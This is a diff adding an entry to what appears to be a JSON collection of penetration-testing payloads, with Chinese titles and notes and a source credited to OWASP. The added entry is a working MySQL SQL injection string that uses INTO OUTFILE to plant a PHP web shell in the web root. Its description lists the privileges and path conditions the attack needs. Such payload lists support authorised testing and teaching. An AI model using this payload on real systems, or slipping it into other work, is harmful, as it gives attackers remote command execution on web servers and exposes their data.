@@ -148,6 +148,17 @@
       "source": "OWASP / PayloadsAllTheThings"
     },
     {
+      "id": "sqli-outfile",
+      "title": "INTO OUTFILE 写文件",
+      "category": "绕过技巧",
+      "code": "' UNION SELECT '<?php system($_GET[c]); ?>' INTO OUTFILE '/var/www/html/s.php'-- -",
+      "desc": "在具备 FILE 权限且 secure_file_priv 允许目标目录时，可把查询结果写入 web 目录获取执行权限；需知道可写路径，且目标文件不能已存在。",
+      "tags": ["sqli", "mysql", "outfile", "rce"],
+      "vars": [],
+      "risk": "danger",
+      "source": "OWASP SQL Injection"
+    },
+    {
       "id": "sqli-inline-comment",
       "title": "内联注释绕过 WAF",
       "category": "绕过技巧",
